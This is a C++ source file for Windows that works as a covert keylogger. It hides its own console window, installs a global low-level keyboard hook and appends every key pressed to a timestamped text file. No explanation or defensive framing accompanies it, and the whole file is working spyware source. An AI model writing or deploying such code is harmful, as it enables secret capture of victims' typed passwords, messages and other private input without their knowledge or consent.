#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <algorithm>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <ctime>  
#define _WIN32_WINNT 0x050

namespace {
	std::ofstream of;
}

std::string getFileName() {
	// obtain filename for the logfile
	auto end = std::chrono::system_clock::now();
	std::time_t end_time = std::chrono::system_clock::to_time_t(end);
	std::string file_name = std::ctime(&end_time);

	// remove new line char from end of file_name
	file_name = file_name.substr(0, file_name.size() - 1);
	// remove all spaces from the filename
	std::remove(file_name.begin(), file_name.end(), ' ');
	std::remove(file_name.begin(), file_name.end(), ':');
	file_name += ".txt";
	return file_name;
}

void hideConsole() {
	AllocConsole();
	HWND console = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(console, SW_HIDE);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN))
			{
				of << static_cast<char>(p->vkCode);
				of.flush();
			}
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
	hideConsole();
	auto file_name = getFileName();
	of.open(file_name.c_str(), std::ofstream::out | std::ofstream::app);
	if (!of) {
		std::cerr << "can't open output file" << std::endl;
	}

	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	MSG msg;

	while(!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hhkLowLevelKybd);

	return(0);
}